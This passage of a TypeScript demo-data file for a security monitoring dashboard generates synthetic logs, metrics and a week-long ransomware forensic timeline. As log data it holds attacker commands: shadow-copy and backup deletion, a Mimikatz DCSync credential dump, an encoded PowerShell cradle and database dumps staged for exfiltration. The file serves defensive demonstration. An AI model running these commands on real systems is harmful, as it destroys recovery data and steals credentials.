  add(2,'WinEvent/Security','EventCode=4624 Logon success. Account: svc_web Type: 5 Service',{ event_id:'4624',target_user:'svc_web',logon_type:'5',auth_result:'success',format:'winevent' },5);
  add(3,'WinEvent/Security','EventCode=4624 NTLM Logon: Administrator from 10.10.2.10 (Pass-the-Hash suspected)',{ event_id:'4624',target_user:'Administrator',src_ip:'10.10.2.10',logon_type:'3',auth_result:'success',format:'winevent' },4*24);
  add(1,'WinEvent/Security','EventCode=4688 New process: powershell.exe -nop -w hidden -EncodedCommand JABjA...',{ event_id:'4688',process:'powershell.exe',subject_user:'jdoe',format:'winevent' },5*24);
  add(1,'WinEvent/Security','EventCode=4688 New process: cmd.exe /c whoami /all',{ event_id:'4688',process:'cmd.exe',subject_user:'jdoe',format:'winevent' },5*24+0.5);
  add(2,'WinEvent/Security','EventCode=4688 New process: vssadmin.exe delete shadows /all /quiet',{ event_id:'4688',process:'vssadmin.exe',subject_user:'SYSTEM',format:'winevent' },1*24);
  add(3,'WinEvent/Security','EventCode=4720 User account created: xcsupport by Administrator',{ event_id:'4720',target_user:'xcsupport',subject_user:'Administrator',format:'winevent' },3*24);
  add(3,'WinEvent/Security','EventCode=4732 xcsupport added to Domain Admins by Administrator',{ event_id:'4732',target_user:'xcsupport',subject_user:'Administrator',format:'winevent' },3*24+0.1);
  add(1,'WinEvent/Security','EventCode=4104 ScriptBlock: Invoke-Portscan -Hosts 10.10.1.0/24 -Ports 22,445,3389',{ event_id:'4104',subject_user:'jdoe',process:'powershell.exe',format:'winevent' },5*24+1);
  add(1,'WinEvent/Security','EventCode=4103 Module: Invoke-Mimikatz -DumpCreds executed by jdoe',{ event_id:'4103',subject_user:'jdoe',process:'powershell.exe',format:'winevent' },3*24);
  add(3,'WinEvent/Security','EventCode=4740 Account locked: jdoe after 5 failures',{ event_id:'4740',target_user:'jdoe',auth_result:'failure',format:'winevent' },0.3);

  // nginx access logs
  const PAGES = ['/api/users','/api/login','/admin/config','/api/alerts','/api/agents','/etc/passwd','/wp-admin','/api/export'];
  const STATUS = ['200','200','200','403','404','500','200','200'];
  for (let i = 0; i < 18; i++) {
    const ip  = i % 3 === 0 ? '185.220.101.35' : (i % 4 === 0 ? '10.10.1.80' : '10.10.1.45');
    const st  = STATUS[i % STATUS.length];
    const pg  = PAGES[i % PAGES.length];
    const mtd = i % 5 === 0 ? 'POST' : 'GET';
    add(1,'nginx',`${ip} - - [14/Jul/2026:0${i%10}:00:00 +0000] "${mtd} ${pg} HTTP/1.1" ${st} 4821`,
      { src_ip:ip, auth_result:st==='200'?'success':st==='403'?'denied':'error', format:'nginx' }, i * 0.3);
  }

  // CEF / IDS events
  add(1,'pf-fw-01','CEF:0|PFSense|pfSense|2.6.0|block|Blocked outbound to C2|9|src=10.10.1.50 dst=185.220.101.35 dpt=443',
    { device_vendor:'PFSense',cef_name:'Blocked outbound to C2',severity:'critical',src_ip:'10.10.1.50',dst_ip:'185.220.101.35',format:'cef' },4.8);
  add(1,'pf-fw-01','CEF:0|PFSense|pfSense|2.6.0|block|SMB scan blocked|7|src=10.10.1.50 dst=10.10.2.0/24 dpt=445',
    { device_vendor:'PFSense',cef_name:'SMB scan blocked',severity:'high',src_ip:'10.10.1.50',format:'cef' },4*24);
  add(1,'snort','CEF:0|Snort|IDS|3.1.6|2001|Cobalt Strike Beacon|10|src=10.10.1.50 dst=185.220.101.35',
    { device_vendor:'Snort',cef_name:'Cobalt Strike Beacon',severity:'critical',src_ip:'10.10.1.50',dst_ip:'185.220.101.35',format:'cef' },5);
  add(2,'snort','CEF:0|Snort|IDS|3.1.6|1001|Nmap SYN Scan|7|src=185.220.101.35 dst=10.10.1.0/24',
    { device_vendor:'Snort',cef_name:'Nmap SYN Scan',severity:'high',src_ip:'185.220.101.35',format:'cef' },5*24);
  add(2,'snort','CEF:0|Snort|IDS|3.1.6|3001|DCSync Detected|10|src=10.10.2.10 dst=10.10.3.5',
    { device_vendor:'Snort',cef_name:'DCSync Detected',severity:'critical',src_ip:'10.10.2.10',format:'cef' },3*24);

  // JSON structured logs
  add(1,'xcloak-agent','{"level":"error","msg":"FIM: /etc/passwd modified","user":"root","hostname":"win-workstation-05"}',
    { severity:'error',user:'root',hostname:'win-workstation-05',format:'json' },1.2);
  add(1,'xcloak-agent','{"level":"warn","msg":"Unsigned driver loaded: evil.sys","pid":8812,"hostname":"win-workstation-05"}',
    { severity:'warn',hostname:'win-workstation-05',format:'json' },6);
  add(2,'xcloak-agent','{"level":"error","msg":"pg_dumpall executed — 14.2GB dump","user":"postgres","hostname":"db-server-02"}',
    { severity:'error',user:'postgres',hostname:'db-server-02',format:'json' },2*24);
  add(3,'xcloak-agent','{"level":"critical","msg":"DCSync attack — 142 accounts dumped","hostname":"dc-01"}',
    { severity:'critical',hostname:'dc-01',format:'json' },3*24);
  add(1,'xcloak-agent','{"level":"info","msg":"Agent isolated from network","hostname":"win-workstation-05","by":"soc-admin"}',
    { severity:'info',hostname:'win-workstation-05',format:'json' },0.2);

  // DNS / syslog
  add(1,'named','query: a1b2c3d4e5.cobalt-beacon.io IN A from 10.10.1.50 → 185.220.101.35',{ src_ip:'10.10.1.50',format:'syslog' },5);
  add(2,'named','REFUSED query from 10.10.2.10: upload.secure-transfer.io IN A',{ src_ip:'10.10.2.10',auth_result:'denied',format:'syslog' },2*24);
  add(1,'named','query: a1b2c3d4e5.cobalt-beacon.io IN A (repeat beacon check-in)',{ src_ip:'10.10.1.50',format:'syslog' },4.9);
  add(1,'named','query: a1b2c3d4e5.cobalt-beacon.io IN A (repeat)',{ src_ip:'10.10.1.50',format:'syslog' },4.8);

  // Misc system
  add(1,'auditd','type=EXECVE a0="vssadmin" a1="delete" a2="shadows" a3="/all" uid=0 pid=11234 hostname=win-workstation-05',
    { user:'root',process:'vssadmin',hostname:'win-workstation-05',format:'syslog' },1*24);
  add(2,'postgres','LOG: duration: 342234ms statement: pg_dumpall -U postgres -f /tmp/.cache/dump.sql',
    { user:'postgres',process:'postgres',hostname:'db-server-02',format:'syslog' },2*24);
  add(1,'cron','CRON[8812]: (jdoe) CMD (C:\\Windows\\System32\\wscript.exe C:\\ProgramData\\beacon.vbs)',
    { user:'jdoe',process:'CRON',hostname:'win-workstation-05',format:'syslog' },6*24);
  add(3,'systemd','winupdsvc.service: Started Windows Update Helper.',{ process:'systemd',hostname:'dc-01',format:'syslog' },6*24);
  add(1,'flask-api','ERROR [app.auth] Login failed for svc_api from 192.168.1.200: token expired',
    { user:'svc_api',src_ip:'192.168.1.200',auth_result:'error',format:'raw' },2);
  add(1,'flask-api','INFO [app.auth] soc_admin authenticated successfully (MFA verified)',
    { user:'soc_admin',src_ip:'10.10.5.100',auth_result:'success',format:'raw' },0.5);
  add(2,'postgres','ERROR: duplicate key value violates unique constraint "users_email_key"',
    { user:'postgres',process:'postgres',format:'raw' },1.5);
  add(1,'kernel','usb 1-1: new high-speed USB device number 3 (SanDisk USB 3.0)',{ process:'kernel',hostname:'win-workstation-05',format:'syslog' },7*24);

  return rows.sort((a: any, b: any) => new Date(b.collected_at).getTime() - new Date(a.collected_at).getTime());
})();

// Saved search pool for demo
const DEMO_SAVED_SEARCHES = [
  { id:1, name:'Auth Failures from External',      query:'src_ip:185.220.101.35 auth_result:failure', time_range:'24h', run_count:12, last_run_at: new Date(Date.now()-3600000).toISOString(),  created_at: new Date(Date.now()-86400000*7).toISOString() },
  { id:2, name:'Windows Privilege Escalation',      query:'event_id:4720 OR event_id:4732',             time_range:'7d',  run_count:5,  last_run_at: new Date(Date.now()-7200000).toISOString(),  created_at: new Date(Date.now()-86400000*5).toISOString() },
  { id:3, name:'PowerShell Execution Events',       query:'event_id:4104 | stats count by user',        time_range:'7d',  run_count:8,  last_run_at: new Date(Date.now()-1800000).toISOString(),  created_at: new Date(Date.now()-86400000*3).toISOString() },
  { id:4, name:'C2 Indicators (regex)',             query:'/cobalt.beacon|secure.transfer/',             time_range:'30d', run_count:3,  last_run_at: new Date(Date.now()-86400000).toISOString(), created_at: new Date(Date.now()-86400000*14).toISOString() },
  { id:5, name:'Credential Dump Detection',         query:'DCSync OR mimikatz OR lsass | top 5 user',   time_range:'30d', run_count:2,  last_run_at: new Date(Date.now()-86400000*2).toISOString(),created_at: new Date(Date.now()-86400000*10).toISOString() },
];
// mutable copy so saves/deletes work within a session
let _savedSearches = [...DEMO_SAVED_SEARCHES];
let _nextSavedId   = 100;

// Live log lines
const LIVE_LOG_LINES = D.endpoint_logs.slice(0, 30).map((l: any) => ({
  id:        l.id,
  agent_id:  l.agent_id,
  source:    l.log_source,
  message:   l.log_message,
  timestamp: l.collected_at,
  severity:  'info',
}));

// Dashboard overview
function dashboardOverview() {
  const alerts    = D.alerts;
  const incidents = D.incidents;
  const agents    = D.agents;
  const critical  = alerts.filter((a: any) => a.severity === 'critical').length;
  const high      = alerts.filter((a: any) => a.severity === 'high').length;
  const online    = agents.filter((a: any) => a.status === 'online').length;
  const tacticMap: Record<string, number> = {};
  alerts.forEach((a: any) => { const t = a.mitre_tactic || 'Unknown'; tacticMap[t] = (tacticMap[t] || 0) + 1; });
  const now = Date.now();
  return {
    critical_alerts:    critical,
    high_alerts:        high,
    total_alerts:       alerts.length,
    open_incidents:     incidents.filter((i: any) => i.status !== 'resolved').length,
    total_incidents:    incidents.length,
    agents_online:      online,
    total_agents:       agents.length,
    soar_executed:      D.playbook_executions.length,
    mttd_minutes:       464,
    mttr_minutes:       0,
    ioc_hits:           0,
    alert_velocity:     96,
    threat_score:       100,
    sensor_coverage:    0,
    mitre_coverage:     tacticMap,
    severity_breakdown: {
      critical, high,
      medium: alerts.filter((a: any) => a.severity === 'medium').length,
      low:    alerts.filter((a: any) => a.severity === 'low').length,
    },
    alert_trend: Array.from({ length: 24 }, (_, i) => ({
      hour:     new Date(now - (23 - i) * 3600000).toISOString(),
      critical: Math.floor(seededRand(i * 4)     * 4),
      high:     Math.floor(seededRand(i * 4 + 1) * 6),
      medium:   Math.floor(seededRand(i * 4 + 2) * 9),
      low:      Math.floor(seededRand(i * 4 + 3) * 5),
    })),
  };
}

// Dashboard metrics
function dashboardMetrics(range: string) {
  const alerts    = D.alerts;
  const incidents = D.incidents;
  const agents    = D.agents;
  const online    = agents.filter((a: any) => a.status === 'online').length;
  const total     = agents.length;
  const critical  = alerts.filter((a: any) => a.severity === 'critical').length;
  const high      = alerts.filter((a: any) => a.severity === 'high').length;
  const now       = Date.now();
  const buckets   = range === '1h' ? 12 : range === '7d' ? 7 : range === '30d' ? 30 : 24;
  const bucketMs  = range === '7d' || range === '30d' ? 86400000 : range === '1h' ? 300000 : 3600000;
  const alert_trend = Array.from({ length: buckets }, (_, i) => ({
    label:    new Date(now - (buckets - 1 - i) * bucketMs).toISOString(),
    critical: Math.floor(seededRand(i * 4)     * 4),
    high:     Math.floor(seededRand(i * 4 + 1) * 6),
    medium:   Math.floor(seededRand(i * 4 + 2) * 9),
    low:      Math.floor(seededRand(i * 4 + 3) * 5),
  }));
  const tacticCounts: Record<string, number> = {};
  alerts.forEach((a: any) => { const t = a.mitre_tactic || 'Defense Evasion'; tacticCounts[t] = (tacticCounts[t] || 0) + 1; });
  const mitre_tactics = Object.entries(tacticCounts).map(([tactic, count]) => ({
    tactic, alert_count: count, severity: count > 20 ? 'critical' : count > 10 ? 'high' : 'medium',
  }));
  const ruleCounts: Record<string, { count: number; severity: string }> = {};
  alerts.forEach((a: any) => { const r = a.rule_name || 'Unknown'; if (!ruleCounts[r]) ruleCounts[r] = { count: 0, severity: a.severity || 'medium' }; ruleCounts[r].count++; });
  const top_rules = Object.entries(ruleCounts).sort((a, b) => b[1].count - a[1].count).slice(0, 8)
    .map(([rule_name, v]) => ({ rule_name, count: v.count, severity: v.severity }));
  const agentCounts: Record<number, number> = {};
  alerts.forEach((a: any) => { agentCounts[a.agent_id] = (agentCounts[a.agent_id] || 0) + 1; });
  const top_agents = Object.entries(agentCounts).sort((a, b) => Number(b[1]) - Number(a[1])).slice(0, 5)
    .map(([agent_id, count]) => { const ag = agents.find((a: any) => a.id === Number(agent_id)); return { agent_id: Number(agent_id), hostname: ag?.hostname || `Agent #${agent_id}`, count }; });
  const sigma_enabled = D.sigma_rules.filter((r: any) => r.enabled).length;
  const yara_enabled  = D.yara_rules.filter((r: any) => r.enabled !== false).length;
  return {
    alert_trend, alert_velocity_1h: 96, threat_score: critical > 30 ? 82 : high > 20 ? 65 : 48,
    anomaly_score: 24, ioc_hits: 0, compliance_score: D.compliance_scores[0]?.score ?? 74, range,
    mttr: { avg_seconds: 0, avg_formatted: '—', total_resolved: incidents.filter((i: any) => i.status === 'resolved').length, last_24h_seconds: 0 },
    mttd: { avg_seconds: 27840, avg_formatted: '7h 44m', sample_count: alerts.length },
    alert_deltas:    { current: alerts.length, previous: Math.floor(alerts.length * 0.85), delta: Math.floor(alerts.length * 0.15), delta_pct: 15 },
    incident_deltas: { current: incidents.filter((i: any) => i.status !== 'resolved').length, previous: 3, delta: incidents.filter((i: any) => i.status !== 'resolved').length - 3, delta_pct: 20 },
    agent_coverage:  { total, online, offline: total - online, pct_online: total > 0 ? Math.round((online / total) * 100) : 0 },
    mitre_tactics, rule_health: { sigma_enabled, sigma_disabled: D.sigma_rules.length - sigma_enabled, sigma_total: D.sigma_rules.length, yara_enabled, yara_total: D.yara_rules.length },
    top_rules, top_agents,
  };
}

// ── Forensic timeline (45 events, 7-day attack story) ────────────────────────

const FORENSIC_TIMELINE = (() => {
  const now = Date.now();
  const t = (daysAgo: number, hoursAgo = 0, minutesAgo = 0) =>
    new Date(now - daysAgo * 86400000 - hoursAgo * 3600000 - minutesAgo * 60000).toISOString();

  const events = [
    // ── DAY 7 — Initial access via USB + phishing ──────────────────────────
    { id: 1001, agent_id: 1, hostname: 'win-workstation-05', event_type: 'login', severity: 'info', created_at: t(7, 8, 0),
      message: 'Successful login: jdoe from 10.10.1.50 (workstation console)',
      details: { username: 'jdoe', source_ip: '10.10.1.50', logon_type: 'interactive', session_id: 'S-1-5-21-3422' } },
    { id: 1002, agent_id: 1, hostname: 'win-workstation-05', event_type: 'usb', severity: 'medium', created_at: t(7, 9, 0),
      message: 'USB mass storage inserted: SanDisk USB 3.0 32GB (serial AA13B4C2)',
      mitre_technique: 'T1091', mitre_name: 'Replication Through Removable Media',
      details: { device: 'SanDisk USB 3.0', size: '32GB', serial: 'AA13B4C2', vendor_id: '0781', product_id: '5581' } },
    { id: 1003, agent_id: 1, hostname: 'win-workstation-05', event_type: 'browser', severity: 'medium', created_at: t(7, 8, 30),
      message: 'Downloaded: update-critical.zip from cdn.office365-update[.]com (Chrome)',
      mitre_technique: 'T1566.002', mitre_name: 'Spearphishing Link',
      details: { browser: 'chrome', url: 'https://cdn.office365-update[.]com/update-critical.zip', filename: 'update-critical.zip', size_mb: 4.7 } },
    { id: 1004, agent_id: 1, hostname: 'win-workstation-05', event_type: 'file', severity: 'high', created_at: t(7, 9, 3),
      message: 'Executable written from USB: D:\\setup.exe → C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost32.exe',
      mitre_technique: 'T1204', mitre_name: 'User Execution',
      details: { src: 'D:\\setup.exe', dst: 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost32.exe', size_mb: 2.1, sha256: 'e3b0c44298fc1c14...b855' } },

    // ── DAY 6 — Execution + persistence ───────────────────────────────────
    { id: 1005, agent_id: 1, hostname: 'win-workstation-05', event_type: 'powershell', severity: 'critical', created_at: t(6, 14, 20),
      message: 'Encoded PowerShell: bypass policy + download cradle detected (parent: svchost32.exe)',
      mitre_technique: 'T1059.001', mitre_name: 'PowerShell',
      details: { cmdline: 'powershell.exe -nop -w hidden -EncodedCommand JABjA...', pid: 4412, parent: 'svchost32.exe', encoded: true } },
    { id: 1006, agent_id: 1, hostname: 'win-workstation-05', event_type: 'scheduled_task', severity: 'high', created_at: t(6, 14, 25),
      message: 'Scheduled task created: \\Microsoft\\Windows\\Maintenance\\WinUpdate (every 4h)',
      mitre_technique: 'T1053.005', mitre_name: 'Scheduled Task/Job',
      details: { task_name: '\\Microsoft\\Windows\\Maintenance\\WinUpdate', trigger: 'PT4H repeat', action: 'wscript.exe C:\\ProgramData\\beacon.vbs', created_by: 'jdoe' } },
    { id: 1007, agent_id: 1, hostname: 'win-workstation-05', event_type: 'registry', severity: 'high', created_at: t(6, 14, 30),
      message: 'Run key added: HKCU\\…\\Run → "Updater" = C:\\ProgramData\\beacon.vbs',
      mitre_technique: 'T1547.001', mitre_name: 'Registry Run Keys / Startup Folder',
      details: { key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', value: 'Updater', data: 'C:\\ProgramData\\beacon.vbs', operation: 'SET' } },
    { id: 1008, agent_id: 1, hostname: 'win-workstation-05', event_type: 'service', severity: 'high', created_at: t(6, 15, 0),
      message: 'New service installed: "Windows Update Helper" (winupdsvc) → C:\\ProgramData\\svchost32.exe',
      mitre_technique: 'T1543.003', mitre_name: 'Windows Service',
      details: { service_name: 'winupdsvc', display_name: 'Windows Update Helper', binary: 'C:\\ProgramData\\svchost32.exe', start_type: 'automatic', pid: 5512 } },

    // ── DAY 5 — C2 beacon + discovery ─────────────────────────────────────
    { id: 1009, agent_id: 1, hostname: 'win-workstation-05', event_type: 'dns', severity: 'high', created_at: t(5, 10, 0),
      message: 'DGA domain queried: a1b2c3d4e5.cobalt-beacon[.]io → 185.220.101.35',
      mitre_technique: 'T1071.004', mitre_name: 'DNS Protocol (C2)',
      details: { query: 'a1b2c3d4e5.cobalt-beacon[.]io', response_ip: '185.220.101.35', record_type: 'A', query_count: 47, is_dga: true } },
    { id: 1010, agent_id: 1, hostname: 'win-workstation-05', event_type: 'network', severity: 'high', created_at: t(5, 10, 2),
      message: 'C2 beacon: 185.220.101.35:443 — 127 packets, avg 12 KB/hr over 8h',
      mitre_technique: 'T1071.001', mitre_name: 'Web Protocols (C2)',
      details: { dst_ip: '185.220.101.35', dst_port: 443, protocol: 'HTTPS', bytes_sent: 245760, bytes_recv: 51200, duration_min: 480 } },
    { id: 1011, agent_id: 1, hostname: 'win-workstation-05', event_type: 'powershell', severity: 'high', created_at: t(5, 11, 0),
      message: 'Network enumeration: Invoke-Portscan 10.10.1.0/24 — ports 22,445,3389',
      mitre_technique: 'T1018', mitre_name: 'Remote System Discovery',
      details: { cmdline: 'powershell.exe -c "Invoke-Portscan -Hosts 10.10.1.0/24 -Ports 22,445,3389"', pid: 6621, script_block_logged: true } },
    { id: 1012, agent_id: 1, hostname: 'win-workstation-05', event_type: 'bash', severity: 'medium', created_at: t(5, 11, 30),
      message: 'Privilege enumeration: whoami /all, net user /domain, net group "Domain Admins"',
      mitre_technique: 'T1069', mitre_name: 'Permission Groups Discovery',
      details: { shell: 'cmd.exe', commands: ['whoami /all', 'net user /domain', 'net group "Domain Admins" /domain'], pid: 6890 } },
    { id: 1013, agent_id: 1, hostname: 'win-workstation-05', event_type: 'alert', severity: 'high', created_at: t(5, 11, 35),
      message: 'SIGMA: Suspicious PowerShell Network Scan — Invoke-Portscan on win-workstation-05',
      mitre_technique: 'T1018', mitre_name: 'Remote System Discovery',
      details: { rule: 'sigma_powershell_network_scan', alert_id: 4412, matched_fields: ['cmdline'], confidence: 0.92 } },

    // ── DAY 4 — Lateral movement ───────────────────────────────────────────
    { id: 1014, agent_id: 1, hostname: 'win-workstation-05', event_type: 'network', severity: 'medium', created_at: t(4, 15, 50),
      message: 'Outbound SMB (445) sweep to 14 internal hosts — lateral movement scan',
      mitre_technique: 'T1021.002', mitre_name: 'SMB/Windows Admin Shares',
      details: { dst_ips: ['10.10.1.55', '10.10.1.60', '10.10.1.70', '10.10.1.80'], dst_port: 445, protocol: 'SMB2', connection_count: 14 } },
    { id: 1015, agent_id: 2, hostname: 'db-server-02', event_type: 'login', severity: 'high', created_at: t(4, 16, 0),
      message: 'Suspicious login: jdoe from 10.10.1.50 via SMB/PsExec (NTLM auth)',
      mitre_technique: 'T1021.002', mitre_name: 'SMB/Windows Admin Shares',
      details: { username: 'jdoe', source_ip: '10.10.1.50', logon_type: 'network', auth_method: 'NTLM', tool_hint: 'PsExec' } },
    { id: 1016, agent_id: 2, hostname: 'db-server-02', event_type: 'bash', severity: 'critical', created_at: t(4, 16, 5),
      message: 'PSEXESVC shell: cmd.exe spawned as NT AUTHORITY\\SYSTEM on db-server-02',
      mitre_technique: 'T1570', mitre_name: 'Lateral Tool Transfer',
      details: { shell: 'cmd.exe', parent: 'PSEXESVC.exe', user: 'NT AUTHORITY\\SYSTEM', pid: 7741, remote_origin: '10.10.1.50' } },
    { id: 1017, agent_id: 3, hostname: 'dc-01', event_type: 'login', severity: 'critical', created_at: t(4, 17, 0),
      message: 'Pass-the-Hash to Domain Controller: Administrator from db-server-02 (NTLM, no Kerberos)',
      mitre_technique: 'T1550.002', mitre_name: 'Pass the Hash',
      details: { username: 'Administrator', source_ip: '10.10.2.10', logon_type: 'network', auth_method: 'NTLM', lm_hash_used: true } },

    // ── DAY 3 — Domain compromise + defense evasion ────────────────────────
    { id: 1018, agent_id: 3, hostname: 'dc-01', event_type: 'powershell', severity: 'critical', created_at: t(3, 9, 0),
      message: 'DCSync attack: Mimikatz lsadump::dcsync /domain /all — 142 account hashes dumped',
      mitre_technique: 'T1003.006', mitre_name: 'DCSync',
      details: { cmdline: 'mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" exit', pid: 8821, accounts_dumped: 142 } },
    { id: 1019, agent_id: 3, hostname: 'dc-01', event_type: 'group_policy', severity: 'critical', created_at: t(3, 9, 30),
      message: 'GPO modified: Default Domain Policy — Defender disabled, audit logging off, PS unrestricted',
      mitre_technique: 'T1562.001', mitre_name: 'Disable or Modify Tools',
      details: { gpo_name: 'Default Domain Policy', gpo_guid: '{31B2F340-016D-11D2-945F-00C04FB984F9}', changes: ['Defender disabled', 'Audit logging off', 'PS unrestricted'], modified_by: 'Administrator' } },
    { id: 1020, agent_id: 3, hostname: 'dc-01', event_type: 'registry', severity: 'high', created_at: t(3, 10, 0),
      message: 'SecurityHealthService disabled via registry: Start changed 2 → 4',
      mitre_technique: 'T1562.001', mitre_name: 'Disable or Modify Tools',
      details: { key: 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService', value: 'Start', old_data: 2, new_data: 4, operation: 'SET' } },
    { id: 1021, agent_id: 3, hostname: 'dc-01', event_type: 'user_action', severity: 'critical', created_at: t(3, 10, 15),
      message: 'Backdoor account created: xcsupport — added to Domain Admins + Enterprise Admins',
      mitre_technique: 'T1136.002', mitre_name: 'Domain Account',
      details: { username: 'xcsupport', groups: ['Domain Admins', 'Enterprise Admins'], created_by: 'Administrator', sid: 'S-1-5-21-3422-1150' } },
    { id: 1022, agent_id: 3, hostname: 'dc-01', event_type: 'alert', severity: 'critical', created_at: t(3, 10, 20),
      message: 'CRITICAL: DCSync credential dump — all domain hashes may be compromised',
      mitre_technique: 'T1003.006', mitre_name: 'DCSync',
      details: { rule: 'sigma_dcsync_attack', alert_id: 5523, matched_fields: ['eventid', 'cmdline'], confidence: 0.98 } },

    // ── DAY 2 — Exfiltration ───────────────────────────────────────────────
    { id: 1023, agent_id: 2, hostname: 'db-server-02', event_type: 'bash', severity: 'critical', created_at: t(2, 13, 0),
      message: 'pg_dumpall executed: all databases → /tmp/.cache/dump.sql (14.2 GB, 342s)',
      mitre_technique: 'T1005', mitre_name: 'Data from Local System',
      details: { cmdline: 'pg_dumpall -U postgres -f /tmp/.cache/dump.sql', pid: 9912, output_size_gb: 14.2, duration_sec: 342 } },
    { id: 1024, agent_id: 2, hostname: 'db-server-02', event_type: 'file', severity: 'high', created_at: t(2, 13, 10),
      message: 'Large staged file: /tmp/.cache/dump.sql.gz (4.1 GB compressed, perms 600)',
      mitre_technique: 'T1074.001', mitre_name: 'Local Data Staging',
      details: { path: '/tmp/.cache/dump.sql.gz', size_gb: 4.1, compression: 'gzip', permissions: '600', owner: 'postgres' } },
    { id: 1025, agent_id: 2, hostname: 'db-server-02', event_type: 'dns', severity: 'high', created_at: t(2, 13, 55),
      message: 'DNS → upload.secure-transfer[.]io (exfil staging domain, TTL 60)',
      mitre_technique: 'T1048', mitre_name: 'Exfiltration Over Alternative Protocol',
      details: { query: 'upload.secure-transfer[.]io', response_ip: '185.220.101.35', record_type: 'A', ttl: 60 } },
    { id: 1026, agent_id: 2, hostname: 'db-server-02', event_type: 'network', severity: 'critical', created_at: t(2, 14, 0),
      message: 'Exfiltration: 4.3 GB sent to 185.220.101.35:443 over 47 minutes (avg 13.1 Mbps)',
      mitre_technique: 'T1048', mitre_name: 'Exfiltration Over Alternative Protocol',
      details: { dst_ip: '185.220.101.35', dst_port: 443, protocol: 'HTTPS', bytes_sent: 4617089024, duration_min: 47, avg_mbps: 13.1 } },
    { id: 1027, agent_id: 2, hostname: 'db-server-02', event_type: 'alert', severity: 'critical', created_at: t(2, 14, 5),
      message: 'DLP: 4.3 GB outbound to unclassified IP in 47 min (threshold 1 GB)',
      mitre_technique: 'T1048', mitre_name: 'Exfiltration Over Alternative Protocol',
      details: { rule: 'dlp_large_outbound', alert_id: 6634, threshold_gb: 1.0, actual_gb: 4.3, dst_ip: '185.220.101.35' } },

    // ── DAY 1 — Ransomware deployment ──────────────────────────────────────
    { id: 1028, agent_id: 1, hostname: 'win-workstation-05', event_type: 'service', severity: 'critical', created_at: t(1, 1, 55),
      message: 'Critical services killed: VSS, MSSQLSERVER, Backup, WSearch (inhibit recovery)',
      mitre_technique: 'T1490', mitre_name: 'Inhibit System Recovery',
      details: { stopped_services: ['VSS', 'MSSQLSERVER', 'wuauserv', 'WSearch', 'BackupExecAgentBrowser'], method: 'net stop' } },
    { id: 1029, agent_id: 1, hostname: 'win-workstation-05', event_type: 'firewall', severity: 'high', created_at: t(1, 1, 50),
      message: 'Firewall rule added: allow outbound to 185.220.101.0/24 (ransom C2 allow-listed)',
      mitre_technique: 'T1562.004', mitre_name: 'Disable or Modify System Firewall',
      details: { rule_name: 'Allow_C2_Out', action: 'allow', direction: 'outbound', dst_cidr: '185.220.101.0/24', port: 'any', added_by: 'NT AUTHORITY\\SYSTEM' } },
    { id: 1030, agent_id: 1, hostname: 'win-workstation-05', event_type: 'file', severity: 'critical', created_at: t(1, 2, 0),
      message: 'Mass encryption: 14,223 files renamed .LOCKED (790 files/min) — ransomware active',
      mitre_technique: 'T1486', mitre_name: 'Data Encrypted for Impact',
      details: { files_renamed: 14223, extension: '.LOCKED', ransom_note: 'C:\\Users\\jdoe\\Desktop\\READ_ME.txt', encryption: 'AES-256', speed_fps: 47 } },
    { id: 1031, agent_id: 2, hostname: 'db-server-02', event_type: 'bash', severity: 'critical', created_at: t(1, 2, 0),
      message: 'Shadow copies deleted: vssadmin delete shadows /all /quiet — 8 snapshots destroyed',
      mitre_technique: 'T1490', mitre_name: 'Inhibit System Recovery',
      details: { cmdline: 'vssadmin delete shadows /all /quiet && wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest', pid: 11234, shadows_deleted: 8 } },
    { id: 1032, agent_id: 2, hostname: 'db-server-02', event_type: 'file', severity: 'critical', created_at: t(1, 2, 5),
      message: 'Ransomware spreading: 8,442 files encrypted (.LOCKED) on db-server-02',
      mitre_technique: 'T1486', mitre_name: 'Data Encrypted for Impact',
      details: { files_renamed: 8442, extension: '.LOCKED', ransom_note: '/root/READ_ME.txt', encryption: 'AES-256' } },
    { id: 1033, agent_id: 3, hostname: 'dc-01', event_type: 'firewall', severity: 'high', created_at: t(1, 2, 10),
      message: 'Domain-wide firewall GPO pushed: AV update servers + backup shares blocked',
      mitre_technique: 'T1562.001', mitre_name: 'Disable or Modify Tools',
      details: { gpo: 'FirewallBlock_AV', blocked_hosts: ['update.microsoft.com', 'backup-srv-01', 'av-update.corp.local'], pushed_by: 'xcsupport' } },
    { id: 1034, agent_id: 1, hostname: 'win-workstation-05', event_type: 'alert', severity: 'critical', created_at: t(1, 2, 15),
      message: 'RANSOMWARE: Mass file encryption on win-workstation-05 — 14K+ files in 18 minutes',
      mitre_technique: 'T1486', mitre_name: 'Data Encrypted for Impact',
      details: { rule: 'ransomware_mass_encryption', alert_id: 7745, files_per_min: 790, agent_isolated: false } },

    // ── TODAY — SOC response ──────────────────────────────────────────────
    { id: 1035, agent_id: 1, hostname: 'win-workstation-05', event_type: 'login', severity: 'high', created_at: t(0, 3, 0),
      message: 'Brute-force blocked: 47 failed logins as Administrator from 185.220.101.35 in 60s',
      mitre_technique: 'T1110', mitre_name: 'Brute Force',
      details: { username: 'Administrator', source_ip: '185.220.101.35', attempts: 47, duration_sec: 60, blocked: true } },
    { id: 1036, agent_id: 1, hostname: 'win-workstation-05', event_type: 'user_action', severity: 'info', created_at: t(0, 8, 30),
      message: 'SOC login: soc-admin from 10.10.5.100 — incident response (INC-2026-0714)',
      details: { username: 'soc-admin', source_ip: '10.10.5.100', action: 'incident_response_login', ticket: 'INC-2026-0714' } },
    { id: 1037, agent_id: 1, hostname: 'win-workstation-05', event_type: 'user_action', severity: 'info', created_at: t(0, 8, 35),
      message: 'Agent isolated: win-workstation-05 — network containment by soc-admin',
      mitre_technique: 'RS0001', mitre_name: 'Network Isolation',
      details: { action: 'isolate', initiated_by: 'soc-admin', ticket: 'INC-2026-0714' } },
    { id: 1038, agent_id: 2, hostname: 'db-server-02', event_type: 'user_action', severity: 'info', created_at: t(0, 8, 40),
      message: 'Agent isolated: db-server-02 — network containment by soc-admin',
      details: { action: 'isolate', initiated_by: 'soc-admin', ticket: 'INC-2026-0714' } },
    { id: 1039, agent_id: 3, hostname: 'dc-01', event_type: 'group_policy', severity: 'info', created_at: t(0, 9, 0),
